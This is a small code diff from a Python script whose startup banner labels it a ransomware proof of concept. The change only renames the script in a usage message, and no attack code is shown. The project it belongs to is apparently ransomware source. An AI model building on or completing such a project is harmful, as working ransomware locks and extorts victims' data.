@@ -82,7 +82,7 @@ def main():
     if len(sys.argv) <= 1:
         print('[*] Ransomware - PoC\n')
         # banner()        
-        print('Usage: python3 main.py -h')
+        print('Usage: python3 main_v2.py -h')
         print('{} -h for help.'.format(sys.argv[0]))
         exit(0)
 
